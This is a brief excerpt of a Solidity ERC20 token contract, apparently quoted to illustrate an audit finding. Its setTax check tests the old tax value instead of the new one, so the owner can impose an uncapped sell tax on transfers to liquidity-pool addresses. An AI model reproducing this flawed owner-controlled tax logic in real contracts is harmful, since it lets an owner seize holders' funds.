...
contract Token is ERC20Permit, VaultOwned {
    ...
    function setTax(uint256 _tax) external onlyOwner returns (bool) {
        require(tax <= 25, 'error: sellTaxFee exceeds maximum value');
        tax = _tax;
        return true;
    }
    ...
    function setLiquidityProvider(address _lpaddress, bool lp)
        external
        onlyOwner
        returns (bool)
    {
        LPaddress[_lpaddress] = lp;
        return true;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
            uint256 tAmount = amount;
            if (LPaddress[recipient] == true) {
                tAmount = amount.mul(tax).div(10000);
                _transfer(msg.sender, rewardAddress, tAmount);
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
      uint256 tAmount = amount;
            if (LPaddress[recipient] == true) {
                tAmount = amount.mul(tax).div(10000);
                _transfer(sender, rewardAddress, tAmount);
                tAmount = amount.sub(tAmount);
            }
